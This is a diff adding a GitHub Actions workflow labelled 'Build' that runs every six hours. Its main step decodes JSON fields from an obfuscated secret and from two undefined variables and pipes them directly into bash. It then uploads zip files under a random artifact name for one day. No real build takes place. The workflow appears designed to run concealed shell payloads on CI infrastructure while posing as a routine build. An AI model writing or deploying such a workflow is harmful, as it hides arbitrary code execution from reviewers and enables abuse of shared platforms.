@@ -1,0 +1,39 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '33 4,10,16,22 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Execute
+        env:
+          jqq303: ${{ secrets.jqq303 }}
+        run: |
+          printf '%s' "$jqq303" | jq -r .s612 | /bin/bash
+          printf '%s' "$upq832" | jq -r .zqnv2 | /bin/bash
+          printf '%s' "$alt2" | jq -r .trn1 | /bin/bash
+
+      - name: Upload artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ZxZnMl2B
+          path: "*.zip"
+          retention-days: 1
